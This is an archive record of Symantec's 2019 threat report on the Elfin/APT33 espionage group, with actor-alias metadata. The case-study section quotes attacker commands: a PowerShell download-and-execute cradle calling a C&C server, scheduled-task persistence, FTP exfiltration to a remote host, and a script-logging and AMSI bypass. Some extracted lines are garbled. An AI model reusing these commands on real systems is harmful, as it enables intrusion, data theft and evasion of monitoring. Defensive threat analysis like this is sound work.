{
    "id": "c1e6ab01-a061-43e7-8c47-df4fd8d6f488",
    "created_at": "2023-01-12T15:03:44.327457Z",
    "updated_at": "2025-03-27T02:16:30.190443Z",
    "deleted_at": null,
    "sha1_hash": "90ff148d8a9faaf89b390c85da690063ee73b74a",
    "title": "2019-03-27 - Elfin- Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.",
    "authors": "",
    "file_creation_date": "2022-05-28T21:59:20Z",
    "file_modification_date": "2022-05-28T21:59:20Z",
    "file_size": 543377,
    "plain_text": "# Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.\n\n**symantec-blogs.broadcom.com/blogs/threat-intelligence/elfin-apt33-espionage**\n\nFigure 3. Elfin attacks by month, 2016\n2019\n\nThreat Hunter TeamSymantec\n\n## Vulnerability exploitation\n\nIn a recent wave of attacks during February 2019, Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR, the widely\nused file archiving and compression utility capable of creating self-extracting archive files. The exploit was used against one target in the\nchemical sector in Saudi Arabia. If successfully exploited on an unpatched computer, the vulnerability could permit an attacker to install any file\non the computer, which effectively permits code execution on the targeted computer.\n\n\n-----\n\no use s t e ta geted o ga at o ece ed a e ca ed Job eta s a, c atte pted to e p o t t e u e ab ty s e as\nlikely delivered via a spear-phishing email. However, prior to this attempted attack, Symantec had rolled out proactive protection against any\n[attempt to exploit this vulnerability (Exp.CVE-2018-20250). This protection successfully protected the targeted organization from being](https://www.symantec.com/security-center/writeup/2019-030106-2440-99)\ncompromised.\n\n## The Shamoon connection\n\nElfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon victim in Saudi\n[Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware (Trojan.Stonedrill) used by Elfin. Because](https://www.symantec.com/security-center/writeup/2017-030708-4403-99)\nthe Elfin and the Shamoon attacks against this organization occurred so close together, there has been speculation that the two groups may\nbe linked. However, Symantec has found no further evidence to suggest Elfin was responsible for these Shamoon attacks to date. We\ncontinue to monitor the activities of both groups closely.\n\n## Elfin’s toolset\n\nElfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source hacking tools.\n\nCustom malware used by the group include:\n\n[Notestuk (Backdoor.Notestuk) (aka TURNEDUP): Malware that can be used to open a backdoor and gather information from a](https://www.symantec.com/security-center/writeup/2017-082502-5203-99)\ncompromised computer.\n[Stonedrill (Trojan.Stonedrill): Custom malware capable of opening a backdoor on an infected computer and downloading additional files.](https://www.symantec.com/security-center/writeup/2017-030708-4403-99)\nThe malware also features a destructive component, which can wipe the master boot record of an infected computer.\nAutoIt backdoor: A custom built backdoor written in the AutoIt scripting language.\n\nIn addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on the cyber underground.\nThese include:\n\n[Remcos (Backdoor.Remvio): A commodity remote administration tool (RAT) that can be used to steal information from an infected](https://www.symantec.com/security-center/writeup/2016-080303-1343-99)\ncomputer.\n[DarkComet (Backdoor.Breut): Another commodity RAT used to open a backdoor on an infected computer and steal information.](http://www.symantec.com/security_response/writeup.jsp?docid=2012-021012-3004-99)\n[Quasar RAT (Trojan.Quasar): Commodity RAT that can be used to steal passwords and execute commands on an infected computer.](https://www.symantec.com/security-center/writeup/2017-020114-1619-99)\n[Pupy RAT (Backdoor.Patpoopy): Commodity RAT that can open a backdoor on an infected computer.](https://www.symantec.com/security-center/writeup/2017-022715-3830-99)\n[NanoCore (Trojan.Nancrat): Commodity RAT used to open a backdoor on an infected computer and steal information.](https://www.symantec.com/security-center/writeup/2014-050908-1738-99)\n[NetWeird (Trojan.Netweird.B): A commodity Trojan which can open a backdoor and steal information from the compromised computer. It](https://www.symantec.com/security-center/writeup/2015-040111-3949-99#summary)\nmay also download additional potentially malicious files.\n\nElfin also makes frequent use of a number of publicly available hacking tools, including:\n\n[LaZagne (SecurityRisk.LaZagne): A login/password retrieval tool](https://www.symantec.com/security-center/writeup/2017-090114-5150-99)\n[Mimikatz (Hacktool.Mimikatz): Tool designed to steal credentials](https://www.symantec.com/security-center/writeup/2012-042615-3731-99)\nGpppassword: Tool used to obtain and decrypt Group Policy Preferences (GPP) passwords\n[SniffPass (SniffPass): Tool designed to steal passwords by sniffing network traffic](https://www.symantec.com/security-center/writeup/2010-011515-5548-99)\n\n## Case study: How an Elfin attack unfolds\n\nIn this section, we describe in detail an Elfin attack on a U.S. organization. On February 12, 2018 at 16:45 (all times are in the organization’s\nlocal time), an email was sent to the organization advertising a job vacancy at an American global service provider. The email contained a\nmalicious link to hxxp://mynetwork.ddns[DOT].net:880.\n\nThe recipient clicked the link and proceeded to download and open a malicious HTML executable file, which in turn loaded content from a C&C\nserver via an embedded iframe. At the same time, code embedded within this file also executed a PowerShell command to download and\nexecute a copy of chfeeds.vbe from the C&C server.\n\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object\nNet.WebClient).DownloadString('hxxps://217.147.168[DOT]46:8088/index.jpg');\n\nA second JavaScript command was also executed, which created a scheduled task to execute chfeeds.vbe multiple times a day.\n\n\n-----\n\na u ( % d %\\\\Syste 3 \\\\c d e e /c o e S e do dde sc tas s e e /C /SC / /\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 01:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"3\"\n/TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 03:00 /f && schtasks.exe /CREATE /SC DAILY /TN\n\"5\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 05:00 /f && schtasks.exe /CREATE /SC DAILY\n/TN \"7\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 07:00 /f && schtasks.exe /CREATE /SC\nDAILY /TN \"9\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 09:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"11\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 11:00 /f && schtasks.exe\n/CREATE /SC DAILY /TN \"13\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 13:00 /f &&\nschtasks.exe /CREATE /SC DAILY /TN \"15\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 15:00 /f\n&& schtasks.exe /CREATE /SC DAILY /TN \"17\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST\n17:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"19\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\"\n/ST 19:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"21\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 21:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"23\"\n/TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 23:00 /f ')\n\nThe chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1). This script in turn downloaded\nand executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from the C&C server (hxxps:// hostmanager.hopto.org). Later at 20:57, the attackers became active on the compromised machine and proceeded to download the archiving tool\nWinRAR.\n\n89.34.237.118  808  hxxp://89.34.237[DOT]118:808/Rar32.exe\n\nAt 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager.\n\n192.119.15.35  880  hxxp://mynetwork.ddns[DOT]net:880/st-36-p4578.ps1\n\nThis tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13.\n\nTwo days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that communicated with\na C&C server (217.147.168.123). Quasar RAT was installed to CSIDL_PROFILE\\appdata\\roaming\\microsoft\\crypto\\smss.exe.\n\nAt this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed\ndownloading a custom .NET FTP tool to the infected computer.\n\n192.119.15.36  880  hxxp://192.119.15[DOT]36:880/ftp.exe\n\nLater at 6:56, the attackers exfiltrated data using this FTP tool to a remote host:\n\nJsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\\appdata\\roaming\\adobe\\rar -a ftp://89.34.237.118:2020 -f /[REDACTED] -u\n\n[REDACTED] -p [REDACTED]\n\nActivity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP\nexfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to\ncsidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP\nclients.\n\nAt this point, additional activity from the attackers continued between March 5 into April, and on April 18 at 11:50, a second remote access tool\nknown as DarkComet was deployed to csidl_profile\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\smss.exe on the infected\ncomputer. This was quickly followed 15 seconds later by the installation of a credential dumping to\ncsidl_profile\\appdata\\roaming\\microsoft\\credentials\\dwm32.exe, and the execution of PowerShell commands via PowerShell Empire, a freely\navailable post-exploitation framework, to bypass logging on the infected machine.\n\n$GPF=[Ref].AsSeMBLy.GeTTYPe('System.Management.Automation.Utils').\"GEtFiE`LD\"\n('cachedGroupPolicySettings','N'+'onPublic,Static');If($GPF){$GPC=$GPF.GeTVALUE($NUlL);If($GPC['ScriptB'+'lockLogging'])\n{$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']\n\n['EnableScriptBlockInvocationLogging']=0}$vAL=\n\n[COlLecTIons.GEneRic.DIctIoNARy[stRiNG,SyStEM.Object]]::nEw();$VAL.ADD('EnableScriptB'+'lockLogging',0);$VaL.Add\n('EnableScriptBlockInvocationLogging',0);$GPC\n\n['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging']=$VaL}ELSe{[SCRIPTBLOck].\"GEtFiE`L\n('signatures','N'+'onPublic,Static').SETVAlue($NuLL,(New-ObjeCt ColLectiONs.GeNERic.HASHSEt[StrInG]))}\n\n[REF].AssemBLy.GetTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%\n{$_.GEtFielD('amsiInitFailed','NonPublic,Static').SETValUe($nUll,$TrUE)};\n\nActivity continued throughout April where additional versions of DarkComet, POSHC2 implants, and an AutoIt backdoor were deployed along\nwith further credential dumping activities.\n\n## Active and agile attacker\n\n\n-----\n\ns o e o t e ost act e g oups cu e t y ope at g t e dd e ast, ta get g a a ge u be o o ga at o s ac oss a d e se a ge\nof sectors. Over the past three years, the group has utilized a wide array of tools against its victims, ranging from custom built malware to offthe-shelf RATs, indicating a willingness to continually revise its tactics and find whatever tools it takes to compromise its next set of victims.\n\n## Protection/Mitigation\n\nSymantec has the following protection in place to protect customers against these attacks:\n\n**File-based protection**\n\n[Backdoor.Notestuk](https://www.symantec.com/security-center/writeup/2017-082502-5203-99)\n[Trojan.Stonedrill](https://www.symantec.com/security-center/writeup/2017-030708-4403-99)\n[Backdoor.Remvio](https://www.symantec.com/security-center/writeup/2016-080303-1343-99)\n[Backdoor.Breut](http://www.symantec.com/security_response/writeup.jsp?docid=2012-021012-3004-99)\n[Trojan.Quasar](https://www.symantec.com/security-center/writeup/2017-020114-1619-99)\n[Backdoor.Patpoopy](https://www.symantec.com/security-center/writeup/2017-022715-3830-99)\n[Trojan.Nancrat](https://www.symantec.com/security-center/writeup/2014-050908-1738-99)\n[Trojan.Netweird.B](https://www.symantec.com/security-center/writeup/2015-040111-3949-99#summary)\n[Exp.CVE-2018-20250](https://www.symantec.com/security-center/writeup/2019-030106-2440-99?om_rssid=sr-mixed30days)\n[SecurityRisk.LaZagne](https://www.symantec.com/security-center/writeup/2017-090114-5150-99)\n[Hacktool.Mimikatz](https://www.symantec.com/security-center/writeup/2012-042615-3731-99)\n[SniffPass](https://www.symantec.com/security-center/writeup/2010-011515-5548-99)\n\n## About the Author\n\n### Threat Hunter Team\n\n**Symantec**\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced\nprotection in Symantec products, and offer analysis that helps customers respond to attacks.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-27 - Elfin- Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S..pdf"
    ],
    "report_names": [
        "2019-03-27 - Elfin- Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S..pdf"
    ],
    "threat_actors": [
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9fe49a5b-f3e6-4fbf-99a1-db15dad460c3",
            "created_at": "2024-05-01T02:03:08.045004Z",
            "updated_at": "2025-03-27T02:05:17.325038Z",
            "deleted_at": null,
            "main_name": "COBALT TRINITY",
            "aliases": [
                "Elfin ",
                "HOLMIUM ",
                "MAGNALIUM ",
                "Peach Sandstorm ",
                "Refined Kitten ",
                "TA451 ",
                "APT33 "
            ],
            "source_name": "Secureworks:COBALT TRINITY",
            "tools": [
                " Cadlotcorg",
                " Dello RAT",
                " Imminent Monitor",
                " KDALogger",
                " Koadic",
                " NanoCore",
                " NetWire",
                " POWERTON",
                " PoshC2",
                " Poylog",
                " PupyRAT",
                " Schoolbag",
                "AutoCore"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b938e2e3-3d1b-4b35-a031-ddf25b912557",
            "created_at": "2022-10-25T16:07:23.35582Z",
            "updated_at": "2025-03-27T02:02:09.750954Z",
            "deleted_at": null,
            "main_name": "APT 33",
            "aliases": [
                "APT 33",
                "ATK 35",
                "Cobalt Trinity",
                "Curious Serpens",
                "Elfin",
                "Holmium",
                "Magnallium",
                "Peach Sandstorm",
                "Refined Kitten",
                "TA451",
                "Yellow Orc"
            ],
            "source_name": "ETDA:APT 33",
            "tools": [
                "Atros2.CKPN",
                "AutoIt backdoor",
                "Breut",
                "CinaRAT",
                "DROPSHOT",
                "DarkComet",
                "DarkKomet",
                "DistTrack",
                "EmPyre",
                "EmpireProject",
                "FYNLOS",
                "FalseFont",
                "Filerase",
                "Fynloski",
                "JuicyPotato",
                "Krademok",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "Mimikatz",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Notestuk",
                "POWERTON",
                "PoshC2",
                "PowerBand",
                "PowerShell Empire",
                "PowerSploit",
                "PsList",
                "Pupy",
                "PupyRAT",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "SHAPESHIFT",
                "Shamoon",
                "Socmer",
                "StoneDrill",
                "TURNEDUP",
                "Tickler",
                "Yggdrasil",
                "Zurten",
                "klovbot",
                "pupy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535824,
    "ts_updated_at": 1743041790,
    "ts_creation_date": 1653775160,
    "ts_modification_date": 1653775160,
    "files": {
        "pdf": "https://archive.orkl.eu/90ff148d8a9faaf89b390c85da690063ee73b74a.pdf",
        "text": "https://archive.orkl.eu/90ff148d8a9faaf89b390c85da690063ee73b74a.txt",
        "img": "https://archive.orkl.eu/90ff148d8a9faaf89b390c85da690063ee73b74a.jpg"
    }
}